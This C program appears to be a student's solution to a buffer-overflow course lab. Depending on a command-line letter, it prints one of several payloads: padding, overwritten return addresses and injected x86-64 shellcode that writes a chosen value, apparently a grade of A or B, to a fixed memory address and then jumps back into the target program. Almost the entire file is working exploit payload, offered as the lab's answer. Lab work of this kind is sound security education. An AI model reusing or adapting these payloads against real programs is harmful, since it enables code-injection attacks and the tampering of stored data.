/*
Single Author info:
All of us contributed equally
	rrshah3 Rhythm R Shah
	smsejwan Shalini M Sejwani
	spshriva Shalki Shrivastava
Group info:
  	rrshah3 Rhythm R Shah
	smsejwan Shalini M Sejwani
	spshriva Shalki Shrivastava
*/


#include <stdio.h>
/*
The assembly code used for case a,b, c is :
__asm__("movq   $0x42,(0x600d84)"); value moved to grade depends on what variable should be: A or B.
__asm__("movq $0x400803,%rax");
__asm__("jmp *%rax");
*/
void main(int argc,char* argv[])
{
	char c=argv[1][0];
	if(c=='e')
		write(1,"Rhyhtm                                                                   ",73);
	else if(c=='d')
	write(1,"Rhyhtm                                                                  \xb8\x07\x40\x00",76);
	else if(c=='c')
		//write(1,"Rhyhtm                                                                  \xb8\x07\x40\x00            \x1e\x08\x40\x00",92);
		write(1,"rhythm\0\x48\xc7\x04\x25\x84\x0d\x60\x00\x42\x00\x00\x00\xff\x34\x25\x03\x08\x40\x00\xc3\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x59\x08\x40\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xff\x7f\x00\x00\x1e\x08\x40\x00",124);
	else if(c=='b')
		write(1,"rhythm\0\x48\xc7\x04\x25\x84\x0d\x60\x00\x42\x00\x00\x00\x48\xc7\xc0\x03\x08\x40\x00\xff\xe0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x59\x08\x40\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xff\x7f\x00\x00\xc7\x0d\x60\x00",124);
	else if(c=='a')
		write(1,"rhythm\0\x48\xc7\x04\x25\x84\x0d\x60\x00\x41\x00\x00\x00\x48\xc7\xc0\x03\x08\x40\x00\xff\xe0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x59\x08\x40\x00\0\0\0\0\0\0\0\0\0\0\0\0\x59\x08\x40\x00\0\0\0\0\0\0\0\0\0\0\0\0\x59\x08\x40\x00\0\0\0\0\0\0\0\0\0\0\0\0\xc7\x0d\x60\x00\0\0\0\0\0\0\0\0\0\0\0\0\xc7\x0d\x60\x00\0\0\0\0\0\0\0\0\0\0\0\0\xc7\x0d\x60\x00",156);
	else if(c=='s')
		write(1,"rhythm\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\x73\x29\x40\x00",108);
}